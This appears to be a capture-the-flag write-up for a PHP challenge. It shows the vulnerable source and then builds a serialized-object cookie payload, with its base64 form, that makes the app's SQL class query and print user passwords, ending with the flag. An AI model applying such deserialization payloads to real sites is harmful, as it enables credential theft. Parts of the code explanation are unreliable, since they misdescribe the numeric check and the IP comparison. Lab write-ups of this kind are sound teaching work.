```php
<?php

class SQL {
    public $query = '';
    public $conn;
    public function __construct() {
    }
    
    public function connect() {
        $this->conn = new SQLite3 ("database.db", SQLITE3_OPEN_READONLY);
    }

    public function SQL_query($query) {
        $this->query = $query;
    }

    public function execute() {
        return $this->conn->query ($this->query); /*SQLi*/
    }

    public function __destruct() {
        if (!isset ($this->conn)) {
            $this->connect ();
        }
        
        $ret = $this->execute ();
        if (false !== $ret) {    
            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
            }}}}
?>
```
This is a PHP class named `SQL` that provides functionality for connecting to a SQLite database and executing SQL queries. The class includes the following methods:

`__construct`: This method is the constructor of the class and is automatically called when an object of this class is created. It does not contain any code, so it has no effect on the object.

`connect`: This method connects to a SQLite database and sets the connection object in the `$conn` property of the class.

`SQL_query`: This method takes a `query` as an argument and sets it in the `$query` property of the class.

`execute`: This method executes the query stored in the `$query` property of the class. It returns the result of the query.

`__destruct`: This method is the destructor of the class and is automatically called when the object is destroyed or goes out of scope. It first checks if the connection object is set, and if it's not, it calls the `connect` method to create the connection. It then calls the `execute` method to execute the query stored in the `$query` property and displays the results using an` HTML <p>` element with a well class.

Note: This code contains a vulnerability to SQL Injection, as user-supplied data is being passed directly into the SQL query without being properly sanitized. This can result in serious security issues if this code is used in a production environment.


```php
<?php
include 'connect.php';

$sql = new SQL();
$sql->connect();
$sql->query = 'SELECT username FROM users WHERE id=';


if (isset ($_COOKIE['leet_hax0r'])) {
    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));
    try {
        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
            die('CANT HACK US!!!');
        }
    } catch(Exception $e) {
        echo $e;
    }} else {
    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
    setcookie ('leet_hax0r', $cookie, time () + (86400 * 30));
}

if (isset ($_REQUEST['id']) && is_numeric ($_REQUEST['id'])) {
    try {
        $sql->query .= $_REQUEST['id'];
    } catch(Exception $e) {
        echo ' Invalid query';
    }}
?>
```
This is a PHP script that connects to a database, creates an instance of a class called `SQL`, and sets up a `cookie`. It then checks if the `id` parameter is set in the request and is numeric. If so, it appends the value of `id` to the end of a `SELECT` query for the `username` field from the `users` table. There is no data validation or sanitization being performed on the `id` parameter, which could potentially leave the script vulnerable to SQL injection attacks.

This code checks if a cookie named `"leet_hax0r"` exists in the user's browser. If it exists, it decodes the value of the cookie using the `base64_decode` function and unserializes it using the `unserialize` function. Then it checks if the resulting data is an array and if the value of the `"ip"` key of the array is equal to the client's IP address stored in `$_SERVER['REMOTE_ADDR']`. If the conditions are met, it displays the message "CANT HACK US!!!".

If the cookie does not exist, it sets a new cookie with the key "leet_hax0r", the value being the base64 encoding of the serialized array containing the client's IP address and sets its expiration to 30 days.

![image](https://user-images.githubusercontent.com/72671239/217081331-e717ef68-f007-453f-9ab3-650a4fe14b42.png)

cookie value is decoded into an array _a:1:{s:2:"ip";s:13:"217.55.16.219";}_

This is a string representation of a serialized PHP array. When serialized, an array can be stored as a string and then unserialized later to retrieve its original data. In this case, the serialized string represents an array with one key-value pair. The key is a string with a value of `"ip"`, and the value is a string with a value of `"217.55.16.219"`. The `"a:1:{...}"` syntax indicates the type of data being stored **(an array with one element)**, and the `"s:2"` and `"s:13"` syntax indicates that the data being stored for the key and value are strings of length 2 and 13, respectively.


create payload `O:3:"SQL":1:{s:5:"query";s:49:"SELECT password as username FROM users WHERE id=1";}` which is a serialized representation of a PHP object.

`"O:3:"SQL":"` represents the class name `"SQL"`. The number 3 is the length of the class name string, `"1:{"`, indicates that there is 1 property of the object, ` "s:5:"query""` is the name of the property, `"query"`, and its length (5).

The value of the property `query` is `"s:49:"SELECT password as username FROM users WHERE id=1""`. The number 49 is the length of the string.

_This serialized string represents an object of the `"SQL"` class with a single property named `"query"` that has a value of `"SELECT password as username FROM users WHERE id=1".`_

encode it to base64 =>` TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6NDk6IlNFTEVDVCBwYXNzd29yZCBhcyB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPTEiO30=`
then using a cookie editor alter the cookie value

![image](https://user-images.githubusercontent.com/72671239/217093055-1136b97c-60ec-4a0a-a940-143d463bc574.png)

save the new cookie value and refresh the page 

![image](https://user-images.githubusercontent.com/72671239/217093415-d8d26fb8-67bf-41a3-918e-f9d53d53c02a.png)

_flag => WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}_
